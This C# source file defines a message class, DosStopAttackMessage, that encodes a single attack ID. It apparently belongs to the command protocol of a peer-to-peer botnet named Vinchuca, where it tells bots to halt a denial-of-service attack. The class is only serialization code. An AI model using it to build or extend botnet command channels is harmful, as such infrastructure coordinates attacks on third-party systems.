using System.IO;
using System.Net;

namespace Vinchuca.Network.Protocol.Messages.Command
{
    class DosStopAttackMessage : CommandMessage
    {
        public ulong AttackId { get; set; }

        public override void EncodePayload(BinaryWriter w)
        {
            w.Write(AttackId);
        }

        public override void DecodePayload(BinaryReader br)
        {
            AttackId = br.ReadUInt64();
        }
    }
}